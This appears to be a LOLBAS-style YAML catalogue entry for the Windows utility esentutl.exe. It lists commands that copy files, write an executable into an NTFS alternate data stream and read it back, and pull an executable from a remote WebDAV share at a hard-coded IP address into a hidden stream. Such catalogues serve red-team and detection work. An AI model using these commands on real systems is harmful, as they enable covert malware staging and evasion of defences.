---
Name: Esentutl.exe
Description: Copy, Download, Write ADS, Read ADS
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: "esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs\
      \ /o     \n     \nesentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe\
      \ /o     \n     \nesentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe\
      \ /o     \n     \nesentutl.exe /y \\\\82.221.113.85\\webdav\\file.exe /d c:\\\
      ADS\\file.txt:file.exe /o"
    Description: ''
  - Command: esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.exe /o
    Description: ''
  - Command: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe
      /o
    Description: ''
Full Path:
  - c:\windows\system32\esentutl.exe
  - c:\windows\sysWOW64\esentutl.exe
Code Sample: []
Detection: []
Resources:
  - https://twitter.com/egre55/status/985994639202283520
Notes: Thanks to egre55 - @egre55
---